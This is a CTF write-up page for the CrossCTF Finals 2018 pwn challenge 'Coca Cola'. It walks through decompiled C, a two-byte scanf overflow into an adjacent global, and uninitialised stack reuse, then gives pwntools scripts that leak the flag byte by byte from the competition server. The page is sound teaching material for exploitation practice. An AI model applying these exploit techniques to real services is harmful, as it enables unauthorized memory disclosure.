



<!DOCTYPE html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="Our CTF writeups">
      
      
        <link rel="canonical" href="https://osilayer8.cf/crossctf-finals2018/pwn/cocacola/README/">
      
      
        <meta name="author" content="OSI Layer 8">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.4, mkdocs-material-2.9.1">
    
    
      
        <title>Coca Cola - OSI Layer 8</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/application.ba0fd1a6.css">
      
        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.6079476c.css">
      
      
        
        
        <meta name="theme-color" content="#03a9f4">
      
    
    
      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="light-blue" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="__github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#crossctf-finals-2018-coca-cola-pwn" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="https://osilayer8.cf/" title="OSI Layer 8" class="md-header-nav__button md-logo">
          
            <img src="../../../../img/logo_white.svg" width="24" height="24">
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                OSI Layer 8
              </span>
              <span class="md-header-nav__topic">
                Coca Cola
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  


  <a href="https://github.com/nushosilayer8/writeups/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#__github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      nushosilayer8
    </div>
  </a>

          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <span class="md-nav__button md-logo">
      
        <img src="../../../../img/logo_white.svg" width="48" height="48">
      
    </span>
    OSI Layer 8
  </label>
  
    <div class="md-nav__source">
      


  


  <a href="https://github.com/nushosilayer8/writeups/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#__github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      nushosilayer8
    </div>
  </a>

    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../README/" title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      CrossCTF 2018 Qualifiers
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        CrossCTF 2018 Qualifiers
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crossctf-quals2018/README/" title="Overview" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crossctf-quals2018/cyoa/README/" title="CYOA" class="md-nav__link">
      CYOA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crossctf-quals2018/pwn/evenflow/README/" title="Even Flow" class="md-nav__link">
      Even Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crossctf-quals2018/crypto/BabyRSA/README/" title="BabyRSA" class="md-nav__link">
      BabyRSA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crossctf-quals2018/crypto/BabyRSA2/README/" title="BabyRSA 2" class="md-nav__link">
      BabyRSA 2
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
    
    <label class="md-nav__link" for="nav-3">
      CrossCTF 2018 Finals
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        CrossCTF 2018 Finals
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../README/" title="Overview" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2" checked>
    
    <label class="md-nav__link" for="nav-3-2">
      Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../ftlog/README/" title="FTLOG" class="md-nav__link">
      FTLOG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../slowmo/README/" title="Slowmo" class="md-nav__link">
      Slowmo
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Coca Cola
      </label>
    
    <a href="./" title="Coca Cola" class="md-nav__link md-nav__link--active">
      Coca Cola
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#first-blood-by-tinyboxer" title="First Blood by : TinyBoxer" class="md-nav__link">
    First Blood by : TinyBoxer
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#static-analysis" title="Static Analysis" class="md-nav__link">
    Static Analysis
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" title="Solution" class="md-nav__link">
    Solution
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../gruffybear/README/" title="GruffyBear" class="md-nav__link">
      GruffyBear
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../souvlaki/README/" title="Souvlaki Space Station" class="md-nav__link">
      Souvlaki Space Station
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      Reversing
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        Reversing
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../re/perfect/README/" title="Perfect" class="md-nav__link">
      Perfect
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../re/rochefort6/README/" title="Tower Of Beer: Rochefort 6" class="md-nav__link">
      Tower Of Beer: Rochefort 6
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../re/rochefort8/README/" title="Tower Of Beer: Rochefort 8" class="md-nav__link">
      Tower Of Beer: Rochefort 8
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../web/gocoin/README/" title="GoCoin!" class="md-nav__link">
      GoCoin!
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../web/gocoinplus/README/" title="GoCoin! Plus" class="md-nav__link">
      GoCoin! Plus
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../web/gocoinplusplus/README/" title="GoCoin! Plus Plus" class="md-nav__link">
      GoCoin! Plus Plus
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../web/terminal/README/" title="The Terminal" class="md-nav__link">
      The Terminal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../web/retroweb/README/" title="RetroWeb" class="md-nav__link">
      RetroWeb
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      Crypto
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/fitblips/README/" title="Fitblips" class="md-nav__link">
      Fitblips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/babyrsa3/README/" title="BabyRSA" class="md-nav__link">
      BabyRSA
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      Misc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/evil/README/" title="The Evilness" class="md-nav__link">
      The Evilness
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/cyoa/cyoa/" title="Choose Your Own Adventure" class="md-nav__link">
      Choose Your Own Adventure
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      Mobile
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        Mobile
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../mobile/human/README/" title="Human Powered Flag Generator" class="md-nav__link">
      Human Powered Flag Generator
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#first-blood-by-tinyboxer" title="First Blood by : TinyBoxer" class="md-nav__link">
    First Blood by : TinyBoxer
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#static-analysis" title="Static Analysis" class="md-nav__link">
    Static Analysis
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" title="Solution" class="md-nav__link">
    Solution
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/nushosilayer8/writeups/edit/master/writeups/crossctf-finals2018/pwn/cocacola/README.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="crossctf-finals-2018-coca-cola-pwn">CrossCTF Finals 2018 : Coca Cola (Pwn)</h1>
<h3 id="first-blood-by-tinyboxer">First Blood by : TinyBoxer</h3>
<blockquote>
<p>Catch the Wave. Coke!</p>
<p>nc ctf.pwn.sg 4001</p>
<p>Creator - amon (@nn_amon)</p>
</blockquote>
<h2 id="static-analysis">Static Analysis</h2>
<p>Running <code>file cocacola</code> gives:</p>
<pre><code>cocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped
</code></pre>

<p>Now on to the code ...</p>
<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int result; // eax
  __off_t v5; // rsi
  int fd; // [rsp+Ch] [rbp-B4h]
  struct stat stat_buf; // [rsp+20h] [rbp-A0h]
  unsigned __int64 v8; // [rsp+B8h] [rbp-8h]

  v8 = __readfsqword(0x28u); // these are canaries btw
  setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering
  setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering
  setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering
  v3 = time(0LL);
  srand(v3); //initalize random seed
  fd = open(&quot;flag_page&quot;, 0, 384LL);
  memset(&amp;stat_buf, 0, sizeof(stat_buf));
  if ( fstat(fd, &amp;stat_buf) == -1 )
  {
    perror(&quot;Error getting the file size&quot;);
    result = -1;
  }
  else
  {
    v5 = stat_buf.st_size;
    mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL);
    printf(&quot;Do you want to flip the flag switch? (y/n) &quot;);
    __isoc99_scanf((__int64)&quot;%2s&quot;, (__int64)&amp;flag);
    coca();
    cola();
    puts(&quot;Did you get it? If not try again.&quot;);
    result = 0;
  }
  return result;
}
</code></pre>

<p>The program opens a file called <code>flag_page</code>. It clears out a <code>stat_buf</code> region of memory, then uses as a <code>stat</code> struct when <code>fstat(fd, &amp;stat_buf)</code> is called. If <code>fstat</code> succeeds, <code>mmap(0x700B100, stats_buf.size, 1, 1, fd, 0)</code> is called.</p>
<p>Looking at <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap documentation</a>, we see that the two <code>1</code>s that are in the earlier mmap call are for the <code>prot</code> and <code>flags</code> arguments. However, note that for the <code>fd</code> argument, we are passing <code>flag_page</code>'s fd, intending to copy the file content into our allocated memory.</p>
<p>Next, it asks us about flipping flag switches (to which the answer is not <code>y</code>, as we will see later). It reads in 2 bytes into the <code>flag</code> global variable then proceeds to call <code>coca()</code> and then <code>cola()</code></p>
<pre><code class="c">unsigned __int64 coca()
{
  char buf; // [rsp+0h] [rbp-110h]
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(art);
  read(0, &amp;buf, 0xFFuLL);
  if ( flag_denied == 0xC5u )
    read(0, &amp;something, 1uLL);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>

<p>We begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable <code>flag_denied</code> is compared to <code>0xc5</code>, and if it equal we read 1 byte into <code>something</code>, another global variable.</p>
<pre><code class="c">unsigned __int64 cola()
{
  int v0; // eax
  signed __int64 v2; // [rsp+0h] [rbp-60h]
  signed __int64 v3; // [rsp+8h] [rbp-58h]
  __int64 v4; // [rsp+10h] [rbp-50h]
  __int64 v5; // [rsp+18h] [rbp-48h]
  __int64 v6; // [rsp+20h] [rbp-40h]
  __int64 v7; // [rsp+28h] [rbp-38h]
  __int64 v8; // [rsp+30h] [rbp-30h]
  int v9; // [rsp+38h] [rbp-28h]
  __int16 v10; // [rsp+3Ch] [rbp-24h]
  const char *v11; // [rsp+48h] [rbp-18h]
  unsigned __int64 v12; // [rsp+58h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  v0 = rand();
  v3 = v0
     - 10000000000LL
     * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0) &gt;&gt; 64) &gt;&gt; 27)
      - ((signed __int64)v0 &gt;&gt; 63))
     + 1;
  if ( something )
  {
    v2 = '\x137';
    strcpy(v4, &quot;Limited Edition Coca Cola - Product of Mexico&quot;);
    v11 = (__int64)&quot;Invalid internal error.&quot;;
  }
  puts(&quot;Here's your randomly generated coke can!&quot;);
  printf(&quot;Version: V.%lu\n&quot;, v2, v2);
  printf(&quot;Serial Number: %lu\n&quot;, v3);
  printf(&quot;Title: %s\n&quot;, &amp;v4);
  if ( flag == 0x44 &amp;&amp; v11 )
  {
    puts(&quot;Errors were found.&quot;);
    printf(&quot;Error: %s\n&quot;, v11);
  }
  return __readfsqword(0x28u) ^ v12;
}
</code></pre>

<p>In this method, we get a random number then do some math to get produce another value, then save it into <code>v3</code>. If <code>something</code> is true, we initalize variables <code>v2</code>, <code>v4</code> and <code>v11</code>. Note that <code>v11</code> has a pointer to some string, not the string itself. Next, we print out some info, then check if the <code>flag</code> variable is <code>0x44</code> and if <code>v11</code> isn't <code>NULL</code>, and print <code>v11</code> out in a <code>print("Error: %s\n")</code>.</p>
<h2 id="solution">Solution</h2>
<p>We see that if <code>something</code> is <code>0</code>, when we print out info in <code>cola()</code>, it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main-&gt;coca is on the same 'level' as main-&gt;cola but main-&gt;cola is not on the same 'level' as main-&gt;cola-&gt;puts). That function is <code>coca()</code>, based on main()'s code. If we look at the <code>read(0, &amp;buf, 0xff)</code>, we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in <code>cola()</code> are from rbp-0x60 onwards, so we can see that we can control all the variables in <code>cola</code> except <code>v0</code>, <code>v3</code> and <code>v12</code>. Note that <code>cola()</code> prints out v11 in <code>printf("Error: %s\n", v11)</code>, interpreting it as a string, as long as <code>flag</code> is <code>0x44</code>. Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of <code>flag_page</code> by setting v11 to <code>0x700B1000</code></p>
<p>So far, we need to set <code>flag</code> to <code>0x44</code>, <code>something</code> to 0, and we also need to set <code>v11</code> to <code>0x700B10000</code> (this can be done in <code>coca()</code>'s <code>read(0, &amp;buf, 0xff)</code>)</p>
<p>Checking the program, we see that something is actually 1 by default</p>
<pre><code class="c">.data:00000000002117F8 something       db    1
</code></pre>

<p>The only place we can change <code>something</code> is in <code>coca()</code>:</p>
<pre><code>if ( flag_denied == 0xC5u )
    read(0, &amp;something, 1uLL);
</code></pre>

<p>and it seems we need to set <code>flag_denied</code> to <code>0xc5</code> first. However, <code>flag_denied</code> is <code>0</code> by default, and there is no other place where it is set:</p>
<pre><code>.bss:00000000002117FD                 public flag
.bss:00000000002117FD flag            db    ? ;               ; DATA XREF: cola+12E↑o
.bss:00000000002117FD                                         ; main+14A↑o
.bss:00000000002117FE                 public flag_denied
.bss:00000000002117FE flag_denied     db    ? ;               ; DATA XREF: coca+42↑o
.bss:00000000002117FF                 db    ? ;
</code></pre>

<p>Hold on, dont we read 2 bytes into <code>flag</code> in <code>main()</code>? Here it says that <code>flag</code> is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into <code>flag_denied</code>.</p>
<p>So far, the plan is:
Set <code>flag</code> and <code>flag_denied</code> to 0x44 and 0xc5 respectively, by sending <code>\x44\xc5</code> to <code>__isoc99_scanf((__int64)"%2s", (__int64)&amp;flag);</code> in <code>main()</code>.</p>
<p>Then, set v11 (at rbp-0x18) to <code>0x700B1000</code> in <code>read(0, &amp;buf, 0xff)</code> in <code>coca()</code> (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding).
</br>Thus, we send <code>'a'*0xf8+p64(0x700B1000+i*32)[:-1]</code>. The <code>[:-1]</code> is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7). </p>
<p>Next, we send <code>\x00</code> to <code>read(0, &amp;something, 1)</code></p>
<p>Putting it all together:</p>
<pre><code class="python">from pwn import *
p = remote('ctf.pwn.sg', 4001)

p.sendafter(&quot;Do you want to flip the flag switch? (y/n) &quot;, '\x44\xC5')
p.send('a'*0xf8+p64(0x700B1000)[:-1])
p.send('\x00')
p.recvuntil('Error: ')
print(p.recvline())
</code></pre>

<p>However ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the <code>puts("Did you get it? If not try again.");</code> in <code>main()</code> imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character).
<br/>Since we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early.</p>
<pre><code class="python">from pwn import *

s = ''

for i in range(50):
    try:
        p = remote('ctf.pwn.sg', 4001)

        p.sendafter(&quot;Do you want to flip the flag switch? (y/n) &quot;, '\x44\xC5')
        p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1])
        p.send('\x00')
        p.recvuntil('Error: ')
        s += p.recv(1)
    except:
        break
print(s)
</code></pre>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../slowmo/README/" title="Slowmo" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Slowmo
              </span>
            </div>
          </a>
        
        
          <a href="../../gruffybear/README/" title="GruffyBear" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                GruffyBear
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/application.a59e2a89.js"></script>
      
      <script>app.initialize({version:"0.17.4",url:{base:"../../../.."}})</script>
      
    
    
      
    
  </body>
</html>